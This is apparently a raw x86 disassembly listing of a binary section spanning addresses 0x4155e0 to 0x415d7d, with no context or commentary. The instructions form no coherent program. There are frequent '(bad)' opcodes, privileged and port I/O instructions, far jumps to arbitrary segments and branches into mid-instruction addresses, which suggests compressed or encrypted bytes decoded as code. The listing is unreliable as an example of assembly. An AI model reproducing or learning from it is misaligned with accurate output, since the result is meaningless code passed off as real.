  4155e0:	or     ebx,eax
  4155e2:	dec    edi
  4155e3:	mov    ebp,0xb345c468
  4155e8:	cld    
  4155e9:	jno    0x415644
  4155eb:	icebp  
  4155ec:	daa    
  4155ed:	call   0x4af1f45a
  4155f2:	dec    BYTE PTR [esi+edi*4-0x3f]
  4155f6:	enter  0x907e,0xca
  4155fa:	sbb    ecx,esp
  4155fc:	cmc    
  4155fd:	or     edi,ebx
  4155ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415600:	subps  xmm0,XMMWORD PTR ds:0xc08193e8
  415607:	mov    edx,DWORD PTR [ebx]
  415609:	add    al,0xd6
  41560b:	sbb    BYTE PTR [eax],0xf8
  41560e:	jne    0x415658
  415610:	xchg   edx,eax
  415611:	lahf   
  415612:	ins    DWORD PTR es:[edi],dx
  415613:	lock mov edi,0x423d9147
  415619:	push   eax
  41561a:	adc    al,0xd0
  41561c:	xor    eax,0xa972c42e
  415621:	stos   DWORD PTR es:[edi],eax
  415622:	movzx  esp,bp
  415625:	and    DWORD PTR [esi],ebx
  415627:	push   es
  415628:	inc    edx
  415629:	add    bh,BYTE PTR [eax-0x3e]
  41562c:	nop
  41562d:	fwait
  41562e:	sahf   
  41562f:	dec    BYTE PTR [eax+0x4911a42a]
  415635:	add    cl,BYTE PTR [ebp-0xb]
  415638:	pop    esp
  415639:	add    BYTE PTR [ebp-0x12],al
  41563c:	fwait
  41563d:	test   BYTE PTR [ecx-0x20b1c4dc],0x64
  415644:	mov    edi,0x670ef96f
  415649:	sar    BYTE PTR [edi+ebx*1-0x6dfde950],0x70
  415651:	sbb    al,0x6f
  415653:	int    0x0
  415655:	cld    
  415656:	repz test al,dh
  415659:	lods   eax,DWORD PTR ds:[esi]
  41565a:	and    BYTE PTR [eax],0x25
  41565d:	call   0xdf58d4cd
  415662:	add    dl,BYTE PTR [ecx]
  415664:	mov    al,ds:0xac22b64b
  415669:	cli    
  41566a:	imul   ecx,DWORD PTR [edi+0x1e21f9a0],0x30
  415671:	inc    edx
  415672:	add    bh,BYTE PTR [eax-0x3e]
  415675:	loopne 0x41564b
  415677:	retf   0x571f
  41567a:	adc    eax,0xbfe60447
  41567f:	sub    al,0x7b
  415681:	add    DWORD PTR [ecx],edi
  415683:	imul   esp,DWORD PTR [eax+0x597bf6e],0x3ef2d7c0
  41568d:	add    DWORD PTR [eax],ecx
  41568f:	fist   WORD PTR [edi-0x7b52f989]
  415695:	and    ebx,0xebbeb506
  41569b:	hlt    
  41569c:	add    DWORD PTR [esi+0x40884901],0xfffffff3
  4156a3:	sti    
  4156a4:	fistp  WORD PTR [ecx]
  4156a6:	fs add eax,0xc5da1574
  4156ac:	jp     0x415646
  4156ae:	push   cs
  4156af:	jl     0x4156b3
  4156b1:	adc    DWORD PTR [edx],edx
  4156b3:	rcl    BYTE PTR [ebx],0x84
  4156b6:	lahf   
  4156b7:	(bad)  
  4156b8:	fdivr  QWORD PTR [eax+0x5e4e956c]
  4156be:	push   edi
  4156bf:	push   ebp
  4156c0:	das    
  4156c1:	loop   0x415672
  4156c3:	push   0x607eda78
  4156c8:	gs lahf 
  4156ca:	pusha  
  4156cb:	pop    esi
  4156cc:	jmp    DWORD PTR [eax+0x5a]
  4156cf:	scas   eax,DWORD PTR es:[edi]
  4156d0:	neg    DWORD PTR [esi-0xc]
  4156d3:	dec    ebp
  4156d4:	std    
  4156d5:	sar    DWORD PTR [ebp-0x7f],0x76
  4156d9:	out    dx,eax
  4156da:	lds    eax,FWORD PTR [ebx]
  4156dc:	sub    bl,0xf9
  4156df:	out    dx,al
  4156e0:	inc    edx
  4156e1:	loopne 0x41571d
  4156e3:	add    al,0x33
  4156e5:	push   cs
  4156e6:	pop    es
  4156e7:	pop    ebp
  4156e8:	add    al,0xc5
  4156ea:	mov    bh,0x44
  4156ec:	adc    al,0xd7
  4156ee:	jle    0x4156ee
  4156f0:	lahf   
  4156f1:	inc    eax
  4156f3:	xchg   ebp,eax
  4156f4:	icebp  
  4156f5:	xchg   edx,ebx
  4156f7:	add    DWORD PTR [ecx],esp
  4156f9:	push   ds
  4156fa:	cmp    BYTE PTR [edx+0x2],al
  4156fd:	js     0x415681
  4156ff:	and    BYTE PTR [ebp-0x46],dh
  415702:	dec    edi
  415703:	inc    edi
  415704:	push   esp
  415705:	ja     0x415748
  415707:	or     eax,0x69e6b0b4
  41570c:	loopne 0x41576c
  41570e:	sbb    eax,0x4191e3f
  415713:	imul   edi,DWORD PTR ds:0x6ba014fc,0xbe818ff7
  41571d:	out    dx,eax
  41571e:	pop    ds
  41571f:	pop    eax
  415720:	or     dh,bh
  415722:	xchg   ecx,eax
  415723:	inc    ebp
  415724:	adc    BYTE PTR [edi+0x10],al
  415727:	hlt    
  415728:	dec    edx
  415729:	mov    eax,DWORD PTR [ebx+0xae042cc]
  41572f:	loopne 0x41578c
  415731:	sbb    DWORD PTR [edx-0x5577af41],ecx
  415737:	and    BYTE PTR [ecx],0x75
  41573a:	jecxz  0x4156c3
  41573c:	out    dx,eax
  41573d:	sub    eax,0xf451fc7d
  415742:	inc    ebx
  415743:	mov    BYTE PTR [edi],al
  415745:	xchg   DWORD PTR [eax+0x34209e00],edx
  41574b:	mov    cs,WORD PTR [esi+0x5b0aae3e]
  415751:	psrld  mm7,QWORD PTR [edx+ecx*4-0x16]
  415756:	leave  
  415757:	mov    ds:0x65e8e7e2,eax
  41575c:	test   eax,0xbe0bbe5f
  415761:	cmp    edi,ebp
  415763:	or     edi,DWORD PTR [esi-0x51]
  415766:	idiv   BYTE PTR [edi]
  415768:	fcomp  DWORD PTR [ecx]
  41576a:	cwde   
  41576b:	cli    
  41576c:	mov    ebp,0x81fbfe3f
  415771:	shl    BYTE PTR [ecx-0x70],0xfa
  415775:	adc    eax,edx
  415777:	mov    bl,0xa
  415779:	push   es
  41577a:	dec    ebx
  41577b:	add    DWORD PTR [ebx-0x606dbeb7],0xd015545a
  415785:	or     al,0xf5
  415787:	cmp    ebx,DWORD PTR [esi]
  415789:	dec    ecx
  41578a:	inc    edi
  41578b:	test   BYTE PTR [eax+0x60],bh
  41578e:	or     BYTE PTR [ecx],cl
  415790:	loopne 0x41579b
  415792:	inc    edx
  415793:	xor    bl,BYTE PTR [ecx]
  415795:	std    
  415796:	lods   al,BYTE PTR ds:[esi]
  415797:	in     al,dx
  415798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415799:	jecxz  0x41580f
  41579b:	fisttp QWORD PTR [edi+0x217dbbfc]
  4157a1:	gs inc eax
  4157a3:	sub    BYTE PTR [ebx+0x33],bh
  4157a6:	add    eax,DWORD PTR [edi]
  4157a8:	add    bh,BYTE PTR [ebp-0x7d]
  4157ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ac:	jnp    0x41573e
  4157ae:	repz pop ds
  4157b0:	pop    esp
  4157b1:	sbb    BYTE PTR [eax+esi*8],al
  4157b4:	jle    0x4157c7
  4157b6:	add    edi,DWORD PTR [esi+0x7f]
  4157b9:	(bad)  
  4157ba:	adc    BYTE PTR [edx+0x5a81e0d2],al
  4157c0:	and    BYTE PTR [eax+0x60164838],0xa8
  4157c7:	and    BYTE PTR [ecx-0x63],bl
  4157ca:	xlat   BYTE PTR ds:[ebx]
  4157cb:	mov    esi,0x895f37f4
  4157d0:	ds xchg edx,eax
  4157d2:	into   
  4157d3:	or     cl,dh
  4157d5:	inc    eax
  4157d6:	adc    BYTE PTR [edx],dl
  4157d8:	rcl    BYTE PTR [ebx],0x82
  4157db:	pop    edi
  4157dc:	sti    
  4157dd:	stos   DWORD PTR es:[edi],eax
  4157de:	xchg   edi,eax
  4157df:	es push esp
  4157e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e2:	jnp    0x415821
  4157e4:	sar    BYTE PTR [esi+0x54af4eaa],1
  4157ea:	mov    bh,0xa7
  4157ec:	stc    
  4157ed:	pop    es
  4157ee:	jae    0x4157e7
  4157f0:	add    DWORD PTR [esi+0x1ffdd7f7],0x6837ee9c
  4157fa:	cli    
  4157fb:	div    DWORD PTR [esp+edi*1]
  4157fe:	hlt    
  4157ff:	push   ss
  415800:	or     BYTE PTR [ecx],dl
  415802:	push   cs
  415803:	mov    ebp,0x3f02122
  415808:	mov    eax,DWORD PTR [ecx-0x6]
  41580b:	push   eax
  41580c:	hlt    
  41580d:	daa    
  41580e:	add    eax,DWORD PTR ds:0xd2f6888b
  415814:	sub    DWORD PTR [esi+0x7b],0xef9be77c
  41581b:	mov    esi,0x253ac8fc
  415820:	les    esi,FWORD PTR [edi-0x61ff6f73]
  415826:	adc    BYTE PTR [esp+ebp*4-0x76534054],bl
  41582d:	outs   dx,BYTE PTR ds:[esi]
  41582e:	pop    edx
  41582f:	xchg   edx,eax
  415830:	std    
  415831:	adc    bl,BYTE PTR [ebp+eiz*8-0x2]
  415835:	cmp    al,0x7d
  415837:	scas   eax,DWORD PTR es:[edi]
  415838:	fimul  DWORD PTR [edi-0x16]
  41583b:	imul   ebp,DWORD PTR [eax+ebx*1+0x8],0xffffffe8
  415840:	or     eax,0xb306ff46
  415845:	add    cl,al
  415847:	call   FWORD PTR ds:[ecx+ecx*2]
  41584b:	add    ah,BYTE PTR [edi+ebx*4+0x38]
  41584f:	ficom  WORD PTR [edi+0x2f]
  415852:	and    al,ch
  415854:	xlat   BYTE PTR ds:[ebx]
  415855:	add    DWORD PTR [ecx+eax*8],eax
  415858:	inc    esi
  415859:	dec    ebp
  41585a:	icebp  
  41585b:	enter  0x9240,0x40
  41585f:	xchg   ebp,eax
  415860:	adc    BYTE PTR [edx+0x20f6bfa6],bh
  415866:	fistp  DWORD PTR ds:0x2422e1e2
  41586c:	and    BYTE PTR [edi],0x4
  41586f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415870:	sub    al,0x7f
  415872:	xchg   DWORD PTR [eax-0x71ed90a4],edx
  415878:	out    0x97,al
  41587a:	add    BYTE PTR [edi],al
  41587c:	or     al,0x80
  41587f:	loopne 0x415864
  415881:	adc    eax,0x1d7e0f3
  415886:	cmp    BYTE PTR [esi],dl
  415888:	add    edx,DWORD PTR [ebp+0x3e]
  41588b:	hlt    
  41588c:	mov    dl,0x6
  41588e:	and    bl,BYTE PTR [eax+0x19]
  415891:	enter  0x9be9,0xf9
  415895:	rcr    DWORD PTR [edx+0x1],0x81
  415899:	pop    ebx
  41589a:	loope  0x4158aa
  41589c:	add    al,0x1
  41589e:	jns    0x4158bf
  4158a0:	xchg   ecx,eax
  4158a1:	or     al,0x2e
  4158a3:	push   cs
  4158a4:	and    dh,al
  4158a6:	mov    dl,0x12
  4158a8:	adc    DWORD PTR [ebx],edx
  4158aa:	fisub  DWORD PTR [edi]
  4158ac:	test   edi,ecx
  4158ae:	cld    
  4158af:	les    esi,FWORD PTR ds:0x9eaefe11
  4158b5:	adc    BYTE PTR [ebx+eax*1-0x681ffb0b],al
  4158bc:	mov    edi,0xb54c5cef
  4158c1:	cmp    ebx,DWORD PTR [edi+0x5b62fc50]
  4158c7:	lds    edi,FWORD PTR [edi-0x64]
  4158ca:	dec    ebx
  4158cb:	nop
  4158cc:	(bad)  
  4158cd:	mov    edi,0x730810f
  4158d2:	adc    eax,DWORD PTR [edx+0x101bbeec]
  4158d8:	or     BYTE PTR [eax+0x7f1afc24],bh
  4158de:	jg     0x41589e
  4158e0:	add    cl,al
  4158e2:	data16 rol BYTE PTR [edx+0x8],1
  4158e6:	bound  eax,QWORD PTR [edi]
  4158e8:	jle    0x415930
  4158ea:	inc    eax
  4158eb:	xchg   edx,eax
  4158ec:	jmp    0xf24f683e
  4158f1:	push   DWORD PTR [edx+0xcc1ddff]
  4158f7:	inc    ecx
  4158f8:	pop    ecx
  4158f9:	add    bl,BYTE PTR [ebp+0x76]
  4158fc:	das    
  4158fd:	inc    esp
  4158fe:	xchg   edx,eax
  4158ff:	leave  
  415900:	jo     0x4158c7
  415902:	loopne 0x41592b
  415904:	add    al,0x21
  415906:	add    DWORD PTR [ecx+eax*1],edi
  415909:	nop
  41590a:	and    al,0xf9
  41590c:	inc    ebx
  41590d:	xchg   edx,eax
  41590e:	jmp    0x41589c
  415910:	retf   
  415911:	jle    0x4158fd
  415913:	dec    ebp
  415914:	xor    edi,edx
  415916:	cmp    BYTE PTR [edi],0x38
  415919:	rol    DWORD PTR [edi+0x7a],0x9f
  41591d:	jbe    0x4158e5
  41591f:	repnz mov ds:0x90b041f7,eax
  415925:	jle    0x4158bd
  415927:	clts   
  415929:	xor    al,BYTE PTR [edx]
  41592b:	add    eax,DWORD PTR [ecx+0x48afbbe]
  415931:	sbb    cl,0x84
  415934:	cmp    BYTE PTR ds:[eax+0x41],0x40
  415939:	add    BYTE PTR [esp+eiz*2],cl
  41593c:	push   ds
  41593d:	test   ah,ah
  41593f:	dec    ebp
  415940:	push   cs
  415941:	shl    BYTE PTR [eax-0x4b],cl
  415944:	les    edx,FWORD PTR [eax-0x2]
  415947:	xchg   ebp,eax
  415948:	xchg   esi,edx
  41594a:	sbb    DWORD PTR [ecx],esp
  41594c:	push   ds
  41594d:	sub    BYTE PTR [edx+0x2],al
  415950:	js     0x415954
  415952:	shr    BYTE PTR ds:0x49a63e17,1
  415958:	mov    dh,0x24
  41595a:	test   BYTE PTR [edi-0x225d7808],dh
  415960:	lahf   
  415961:	scas   al,BYTE PTR es:[edi]
  415962:	mov    ebx,0x9fe7b02f
  415967:	jecxz  0x41594b
  415969:	out    0xff,eax
  41596b:	sub    eax,0x14049bee
  415970:	xor    BYTE PTR [eax+0x7b7d4bf0],al
  415976:	rol    DWORD PTR [eax+0x32000fd],cl
  41597c:	xchg   ebx,eax
  41597d:	test   DWORD PTR [edx-0x7c52f81d],eax
  415983:	pusha  
  415984:	lods   eax,DWORD PTR ds:[esi]
  415985:	shl    al,0x23
  415988:	sbb    DWORD PTR [edi+0x15],0xa89d9038
  41598f:	out    dx,al
  415990:	in     al,dx
  415991:	jle    0x415981
  415993:	popa   
  415994:	test   BYTE PTR [edi-0x78],0x7
  415998:	xchg   DWORD PTR [eax-0x38ce200],edx
  41599e:	out    0xdf,al
  4159a0:	stc    
  4159a1:	mov    ah,0x90
  4159a3:	sbb    ebp,DWORD PTR [ebp-0x6302ab11]
  4159a9:	mov    edi,0xf26e03f0
  4159ae:	mov    al,ds:0xdc2dfe1f
  4159b3:	add    al,ch
  4159b5:	xlat   BYTE PTR ds:[ebx]
  4159b6:	add    DWORD PTR [eax+0x60f7cdf4],edi
  4159bc:	push   cs
  4159bd:	xor    BYTE PTR [ebx],0x40
  4159c0:	sbb    al,0xae
  4159c2:	cmp    edx,DWORD PTR [eax+0x28]
  4159c5:	adc    al,0x14
  4159c7:	add    ecx,edx
  4159c9:	ja     0x4159e4
  4159cb:	push   es
  4159cc:	jmp    0x4159d8
  4159ce:	fadd   QWORD PTR [ecx]
  4159d0:	lea    ebx,[edi]
  4159d2:	xchg   esp,eax
  4159d3:	pop    ds
  4159d4:	pop    es
  4159d5:	dec    edi
  4159d6:	push   cs
  4159d7:	xchg   edx,eax
  4159d8:	and    al,0x2f
  4159da:	cmp    esp,DWORD PTR [ecx]
  4159dc:	cmp    ch,BYTE PTR [ebp-0x2c098119]
  4159e2:	mov    ecx,0x3dd04791
  4159e7:	and    DWORD PTR [esi-0xffb7bb3],edi
  4159ed:	cwde   
  4159ee:	arpl   di,di
  4159f0:	mov    ebp,0xdba24b95
  4159f5:	cmp    BYTE PTR [edi],ch
  4159f7:	stc    
  4159f8:	mov    esi,DWORD PTR [ecx-0x16]
  4159fb:	cli    
  4159fc:	add    BYTE PTR [eax],0xe
  4159ff:	fdiv   st,st(3)
  415a01:	and    DWORD PTR [esi],0x7c
  415a04:	das    
  415a05:	enter  0x3fef,0xe8
  415a09:	add    edi,edi
  415a0b:	in     eax,0xf8
  415a0d:	jmp    0x415a0f
  415a0f:	imul   dl
  415a11:	push   es
  415a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a13:	jle    0x415a86
  415a15:	push   eax
  415a16:	scas   eax,DWORD PTR es:[edi]
  415a17:	shl    BYTE PTR ds:[edi-0x18500ff4],0x5a
  415a1f:	std    
  415a20:	jge    0x4159a5
  415a22:	push   ebx
  415a23:	add    DWORD PTR [ebx+0x34b280d9],0x60
  415a2a:	add    eax,0xbac1a5f8
  415a2f:	ins    BYTE PTR es:[edi],dx
  415a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a31:	pushf  
  415a32:	mov    ?,esp
  415a34:	fisub  DWORD PTR [ebx]
  415a36:	jmp    0x242:0x6df10a2
  415a3d:	js     0x415a0b
  415a3f:	push   ecx
  415a40:	lahf   
  415a41:	mov    ecx,0xd748b1fe
  415a46:	mov    cs,WORD PTR [eax-0x72]
  415a49:	pop    edi
  415a4a:	std    
  415a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a4c:	jnp    0x4159d0
  415a4e:	out    dx,eax
  415a4f:	cmp    BYTE PTR [ebp-0x1],bh
  415a52:	aas    
  415a53:	mov    ah,bl
  415a55:	retf   
  415a56:	rol    DWORD PTR [eax+eiz*1+0x77c51fb9],0xed
  415a5e:	mov    esi,0x5afa0796
  415a63:	aas    
  415a64:	mov    al,dh
  415a66:	(bad)  
  415a68:	push   cs
  415a69:	adc    DWORD PTR [ebp-0x7e],0xffffff83
  415a6d:	push   esi
  415a6e:	test   BYTE PTR [edi],cl
  415a70:	xor    eax,esp
  415a72:	push   0x40
  415a74:	aas    
  415a75:	mov    dh,0x20
  415a77:	dec    ebx
  415a78:	sahf   
  415a79:	inc    ebp
  415a7a:	adc    DWORD PTR [esp+edx*1-0x1e7f8b9c],ebp
  415a81:	cdq    
  415a82:	mov    al,0x2a
  415a84:	lock or DWORD PTR [eax+0x48],eax
  415a88:	add    BYTE PTR [edi-0x50f4a5c7],cl
  415a8e:	mov    esp,0x75f27f2e
  415a93:	mov    ds:0x988551,al
  415a98:	jne    0x415ada
  415a9a:	sti    
  415a9b:	or     eax,DWORD PTR [ecx]
  415a9d:	mov    ds,WORD PTR [edi-0x6f]
  415aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aa1:	test   al,0xf4
  415aa3:	mov    ds:0x9bea92f5,al
  415aa8:	cld    
  415aa9:	or     al,0xf8
  415aab:	out    dx,eax
  415aac:	outs   dx,BYTE PTR ds:[esi]
  415aad:	fistp  WORD PTR [edi+ecx*1+0x5bee7e8a]
  415ab4:	sub    DWORD PTR [eax],ebx
  415ab6:	jp     0x415b07
  415ab8:	adc    al,0xea
  415aba:	sbb    eax,0x88036c14
  415abf:	(bad)  
  415ac0:	ja     0x415ace
  415ac2:	into   
  415ac3:	or     eax,0x7240210
  415ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac9:	push   ss
  415aca:	test   al,0xe
  415acc:	call   0x71e4b8a0
  415ad1:	in     eax,dx
  415ad2:	jnp    0x415b12
  415ad4:	test   ch,0x5f
  415ad7:	cld    
  415ad8:	mov    ch,0xc8
  415ada:	mov    ds:0xff10a7ea,eax
  415adf:	jle    0x415b31
  415ae1:	into   
  415ae2:	cli    
  415ae3:	push   es
  415ae4:	inc    edx
  415ae5:	cld    
  415ae6:	fprem  
  415ae8:	pop    ebx
  415ae9:	jg     0x415ad2
  415aeb:	out    dx,eax
  415aec:	lea    ebx,[esi]
  415aee:	in     eax,dx
  415aef:	in     eax,dx
  415af0:	aas    
  415af1:	mov    edi,0x611f89f8
  415af6:	jg     0x415ae2
  415af8:	and    eax,0x8aff1b92
  415afd:	mov    eax,0x3d5286b4
  415b02:	inc    eax
  415b03:	fsub   DWORD PTR [eax]
  415b05:	ja     0x415b47
  415b07:	sub    BYTE PTR [eax+0x34],bh
  415b0a:	sub    DWORD PTR cs:[eax+edi*2-0x11],0x4e3bc983
  415b13:	fistp  DWORD PTR [edi+0x13febfe]
  415b19:	pop    eax
  415b1a:	test   BYTE PTR [edi+0x3b],0x70
  415b1e:	pop    ss
  415b1f:	and    al,0xb9
  415b21:	outs   dx,DWORD PTR ds:[esi]
  415b22:	cmp    eax,0x17d83fbc
  415b27:	adc    al,0x5
  415b29:	cmc    
  415b2a:	loop   0x415b31
  415b2c:	add    ebp,ecx
  415b2e:	inc    edx
  415b2f:	xlat   BYTE PTR ds:[ebx]
  415b30:	push   es
  415b31:	leave  
  415b32:	push   es
  415b33:	lds    eax,FWORD PTR [esi]
  415b35:	ret    
  415b36:	xchg   BYTE PTR [esi+0x1c64dd0b],dh
  415b3c:	stc    
  415b3d:	loop   0x415af2
  415b3f:	aam    0x27
  415b41:	pop    edi
  415b42:	rcr    DWORD PTR [esi-0x2116e682],0xe6
  415b49:	push   esp
  415b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b4b:	jl     0x415b3f
  415b4d:	adc    eax,esp
  415b4f:	nop    DWORD PTR [ecx-0x79]
  415b53:	test   eax,edi
  415b55:	jae    0x415b7a
  415b57:	and    al,0x80
  415b59:	(bad)  
  415b5a:	sbb    BYTE PTR [esi-0x3c],ah
  415b5d:	cld    
  415b5e:	call   0x76882224
  415b63:	ja     0x415b5a
  415b65:	push   cs
  415b66:	xchg   ecx,eax
  415b67:	les    ebx,FWORD PTR [edi+eax*1]
  415b6a:	mov    bl,0x3f
  415b6c:	dec    eax
  415b6d:	and    DWORD PTR [edx],ecx
  415b6f:	iret   
  415b70:	dec    edi
  415b71:	jmp    0x415b97
  415b73:	push   0xffffffb7
  415b75:	jno    0x415bed
  415b77:	ffreep st(6)
  415b79:	test   al,0xde
  415b7b:	inc    ebp
  415b7c:	push   esp
  415b7d:	(bad)  
  415b7e:	push   eax
  415b7f:	in     al,dx
  415b80:	or     dh,BYTE PTR [edx-0x29]
  415b83:	mov    bl,0x6
  415b85:	lods   al,BYTE PTR ds:[esi]
  415b86:	cs enter 0x4f11,0x58
  415b8b:	lods   eax,DWORD PTR ds:[esi]
  415b8c:	mov    dh,0xaf
  415b8e:	mov    eax,ds:0x203b7015
  415b93:	aam    0xbe
  415b95:	lahf   
  415b96:	out    dx,eax
  415b97:	cmp    BYTE PTR [esi+0x6feb80a5],bl
  415b9d:	xor    edi,0x32
  415ba0:	mov    ebp,0x924c465
  415ba5:	xor    al,0xd9
  415ba7:	cmp    esp,DWORD PTR [edi+0xaeaf1d5]
  415bad:	test   BYTE PTR [edx-0x25d69ddd],ch
  415bb3:	jmp    0xc5b6:0x59baf724
  415bba:	sbb    cl,bl
  415bbc:	sub    ebx,DWORD PTR [edi+0xcf73721]
  415bc2:	(bad)  
  415bc3:	aaa    
  415bc4:	outs   dx,DWORD PTR ds:[esi]
  415bc5:	rcr    DWORD PTR [eax+0x5f],cl
  415bc8:	daa    
  415bc9:	push   ss
  415bca:	lea    ecx,[edx-0x2b]
  415bcd:	outs   dx,BYTE PTR ds:[esi]
  415bce:	sti    
  415bcf:	xor    eax,0xac780242
  415bd4:	adc    DWORD PTR [edx],edx
  415bd6:	shl    BYTE PTR [ebx+0xc],0x45
  415bda:	sar    DWORD PTR [edi],cl
  415bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bdd:	sub    ch,BYTE PTR [edx]
  415bdf:	int    0x66
  415be1:	xchg   ebx,eax
  415be2:	stos   DWORD PTR es:[edi],eax
  415be3:	xlat   BYTE PTR ds:[ebx]
  415be4:	scas   al,BYTE PTR es:[edi]
  415be5:	push   edx
  415be6:	test   eax,0xa81c7194
  415beb:	and    eax,0x3f665017
  415bf0:	inc    ebx
  415bf1:	jge    0x415be1
  415bf3:	xchg   esp,eax
  415bf4:	leave  
  415bf5:	mov    eax,ds:0x35c3d518
  415bfa:	mov    dh,0x6f
  415bfc:	std    
  415bfd:	adc    ecx,edx
  415bff:	outs   dx,BYTE PTR ds:[esi]
  415c00:	adc    ecx,0xd2b49344
  415c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c07:	fstp   TBYTE PTR [eax+eax*1]
  415c0a:	jae    0x415c27
  415c0c:	lds    ebp,FWORD PTR [eax]
  415c0e:	shr    DWORD PTR [ebp-0x6e8bee2b],1
  415c14:	gs fcmovnbe st,st(3)
  415c17:	cli    
  415c18:	mov    dh,0x8d
  415c1a:	rol    BYTE PTR [esi],0x19
  415c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c1e:	pusha  
  415c1f:	call   0xc82a:0x2ae1229f
  415c26:	sbb    cl,BYTE PTR [esi+0x1a6ae32b]
  415c2c:	push   edx
  415c2d:	and    al,BYTE PTR [edi-0x47]
  415c30:	sbb    esp,DWORD PTR [ebp-0x1696af24]
  415c36:	imul   eax,esi,0x5602fa3e
  415c3c:	ins    BYTE PTR es:[edi],dx
  415c3d:	and    BYTE PTR [edx+0x763e2593],0x91
  415c44:	std    
  415c45:	adc    DWORD PTR [ebx-0x22],0xfffffffd
  415c49:	(bad)  
  415c4a:	pop    ebx
  415c4b:	enter  0x4492,0xc6
  415c4f:	enter  0x71b1,0xf7
  415c53:	es fwait
  415c55:	dec    ebx
  415c56:	mov    bh,0x71
  415c58:	jno    0x415c13
  415c5a:	clc    
  415c5b:	aam    0xd3
  415c5d:	lods   al,BYTE PTR ds:[esi]
  415c5e:	scas   eax,DWORD PTR es:[edi]
  415c5f:	lods   eax,DWORD PTR ds:[esi]
  415c60:	jl     0x415c48
  415c62:	mov    edi,0xf23f9bfc
  415c67:	fistp  QWORD PTR [edi-0xf]
  415c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c6b:	jle    0x415c3f
  415c6d:	std    
  415c6e:	ja     0x415c27
  415c70:	les    ebx,FWORD PTR ss:[ecx+0x20]
  415c74:	and    al,0x80
  415c76:	(bad)  
  415c77:	adc    al,0xff
  415c79:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c7b:	mov    edi,0xfe9a6a68
  415c80:	leave  
  415c81:	cdq    
  415c82:	fstp   DWORD PTR [ecx]
  415c84:	mov    ds:0x82491351,al
  415c89:	xchg   ecx,eax
  415c8a:	loope  0x415c9d
  415c8c:	mov    ds:0x109218d1,al
  415c91:	lods   al,BYTE PTR ds:[esi]
  415c92:	(bad)  
  415c94:	push   es
  415c95:	int    0x66
  415c97:	add    edx,DWORD PTR [esi]
  415c99:	into   
  415c9a:	adc    DWORD PTR [ebp+0x7a1ad38d],ecx
  415ca0:	xchg   ebp,eax
  415ca1:	inc    edx
  415ca2:	mov    ds:0x3cee7e89,eax
  415ca7:	leave  
  415ca8:	test   eax,0x6952a61
  415cad:	stos   BYTE PTR es:[edi],al
  415cae:	sub    cl,BYTE PTR [eax-0x310d198]
  415cb4:	jmp    0xef5e8590
  415cb9:	adc    cl,BYTE PTR [ecx-0x3a0b8398]
  415cbf:	sub    ebp,DWORD PTR [eax-0x3e]
  415cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc3:	push   esi
  415cc4:	scas   eax,DWORD PTR es:[edi]
  415cc5:	xchg   ebx,eax
  415cc6:	dec    esi
  415cc7:	call   0x798f73e8
  415ccc:	sti    
  415ccd:	fnstsw WORD PTR [ebx+0x73363bb4]
  415cd3:	out    0x2f,eax
  415cd5:	jb     0x415cc0
  415cd7:	rol    BYTE PTR [ebp+0xa],cl
  415cda:	daa    
  415cdb:	sub    eax,0x9a24d564
  415ce0:	int3   
  415ce1:	lock into 
  415ce3:	sbb    ebp,edi
  415ce5:	mov    al,0xbe
  415ce7:	mov    esi,0x41993c45
  415cec:	cdq    
  415ced:	mov    ebx,0x58756d82
  415cf2:	pop    ebp
  415cf3:	mov    esi,0x1229d64b
  415cf8:	mov    ebx,DWORD PTR [ecx]
  415cfa:	pop    esp
  415cfb:	mov    ecx,0xa8ac8b30
  415d00:	in     al,0x72
  415d02:	cmp    DWORD PTR [esi+0x1c2dd5f6],edi
  415d08:	(bad)  
  415d09:	and    DWORD PTR [ecx-0x68d6afb8],edx
  415d0f:	sub    BYTE PTR ds:0x8d8d4f8b,dl
  415d15:	lea    ebx,[esi+0x2]
  415d18:	outs   dx,BYTE PTR ds:[esi]
  415d19:	popf   
  415d1a:	jne    0x415d9b
  415d1c:	xchg   al,bh
  415d1e:	(bad)  
  415d1f:	or     BYTE PTR [ecx],cl
  415d21:	loopne 0x415d54
  415d23:	inc    ebp
  415d24:	ss popf 
  415d26:	jle    0x415cd6
  415d28:	push   esp
  415d29:	lods   eax,DWORD PTR ds:[esi]
  415d2a:	dec    esi
  415d2b:	mov    cs,WORD PTR [ebp+0x4c]
  415d2e:	xor    dh,BYTE PTR [esp+edx*4]
  415d31:	mov    ds:0x65827274,eax
  415d36:	(bad)  [esp+ecx*2+0x4c]
  415d3a:	nop
  415d3b:	leave  
  415d3c:	out    0xe8,al
  415d3e:	je     0x415d7b
  415d40:	xor    al,0x9a
  415d42:	or     eax,0xf976f70e
  415d47:	ror    BYTE PTR [ebx+0x4c869893],1
  415d4d:	mov    ebx,0x899b22d5
  415d52:	mov    al,0xb3
  415d54:	mov    cl,0xce
  415d56:	out    dx,al
  415d57:	out    dx,al
  415d58:	cs xchg edx,eax
  415d5a:	sub    al,0x31
  415d5c:	xor    eax,0xc4c8c73d
  415d61:	and    dh,BYTE PTR [ebp+0x746e4c96]
  415d67:	xchg   esp,eax
  415d68:	stos   BYTE PTR es:[edi],al
  415d69:	xor    ecx,DWORD PTR [esi-0x53]
  415d6c:	push   esi
  415d6d:	in     eax,0xf0
  415d6f:	enter  0x5666,0x9f
  415d73:	(bad)  
  415d74:	lea    ecx,[ecx]
  415d76:	mov    WORD PTR [ecx-0x715cb1c8],ss
  415d7c:	xchg   ecx,eax
  415d7d:	pop    esi
